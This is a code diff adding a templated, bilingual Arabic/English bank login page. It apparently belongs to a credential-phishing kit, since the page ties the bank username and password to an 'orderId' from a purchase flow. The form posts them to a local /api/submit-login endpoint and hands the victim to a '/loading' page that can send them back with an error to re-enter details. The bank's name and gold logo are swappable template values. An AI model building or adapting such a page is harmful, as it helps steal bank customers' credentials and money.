@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="<%= lang %>" dir="<%= lang === 'ar' ? 'rtl' : 'ltr' %>">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title><%= t.loginTitle %> - <%= t.bankName %></title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: linear-gradient(135deg, #c8a84e 0%, #d4af37 25%, #f0d060 50%, #d4af37 75%, #c8a84e 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .login-container {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 16px;
+            padding: 40px 30px;
+            width: 100%;
+            max-width: 400px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            text-align: center;
+        }
+        .login-logo {
+            margin-bottom: 20px;
+        }
+        .login-logo img {
+            width: 180px;
+        }
+        .login-subtitle {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 25px;
+        }
+        .form-group {
+            margin-bottom: 18px;
+            text-align: start;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 6px;
+            font-weight: 600;
+            color: #333;
+            font-size: 14px;
+        }
+        .input-wrapper {
+            position: relative;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px 40px 12px 15px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 15px;
+            font-family: 'Cairo', sans-serif;
+            transition: border-color 0.3s;
+        }
+        .form-group input:focus {
+            outline: none;
+            border-color: #d4af37;
+        }
+        .eye-toggle {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            color: #999;
+            font-size: 18px;
+            background: none;
+            border: none;
+            padding: 5px;
+        }
+        [dir="rtl"] .eye-toggle { left: 10px; }
+        [dir="ltr"] .eye-toggle { right: 10px; }
+        [dir="rtl"] .form-group input { padding: 12px 15px 12px 40px; }
+        .error-msg {
+            color: #e74c3c;
+            font-weight: 700;
+            font-size: 14px;
+            margin-bottom: 15px;
+            display: none;
+        }
+        .error-msg.show {
+            display: block;
+        }
+        .forgot-link {
+            display: block;
+            text-align: center;
+            color: #d4af37;
+            font-size: 13px;
+            margin-bottom: 20px;
+            text-decoration: none;
+        }
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #d4af37, #c8a84e);
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 700;
+            font-family: 'Cairo', sans-serif;
+            cursor: pointer;
+            transition: opacity 0.3s;
+        }
+        .submit-btn:hover {
+            opacity: 0.9;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-logo">
+            <img src="/images/logo-gold.png" alt="<%= t.bankName %>">
+        </div>
+        <p class="login-subtitle"><%= t.loginSubtitle %></p>
+
+        <div class="error-msg" id="errorMsg"><%= t.loginError %></div>
+
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="username"><%= t.username %></label>
+                <div class="input-wrapper">
+                    <input type="text" id="username" name="username" required>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label for="password"><%= t.password %></label>
+                <div class="input-wrapper">
+                    <input type="password" id="password" name="password" required>
+                    <button type="button" class="eye-toggle" id="eyeToggle">&#128065;</button>
+                </div>
+            </div>
+
+            <a href="#" class="forgot-link"><%= t.forgotCredentials %></a>
+
+            <button type="submit" class="submit-btn"><%= t.loginBtn %></button>
+        </form>
+    </div>
+
+    <script>
+    (function() {
+        var params = new URLSearchParams(window.location.search);
+        var lang = params.get('lang') || 'ar';
+        var orderId = parseInt(params.get('orderId'));
+        var errorParam = params.get('error');
+
+        // Show error if redirected from loading page
+        if (errorParam) {
+            document.getElementById('errorMsg').classList.add('show');
+        }
+
+        // Eye toggle
+        var eyeToggle = document.getElementById('eyeToggle');
+        var passwordInput = document.getElementById('password');
+        eyeToggle.addEventListener('click', function() {
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+            } else {
+                passwordInput.type = 'password';
+            }
+        });
+
+        // Form submit
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            var data = {
+                orderId: orderId,
+                username: document.getElementById('username').value,
+                password: document.getElementById('password').value
+            };
+
+            fetch('/api/submit-login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .then(function(r) { return r.json(); })
+            .then(function(d) {
+                if (d.ok) {
+                    window.location.href = '/loading?lang=' + lang + '&orderId=' + orderId;
+                }
+            })
+            .catch(function(err) {
+                console.error(err);
+            });
+        });
+    })();
+    </script>
+</body>
+</html>
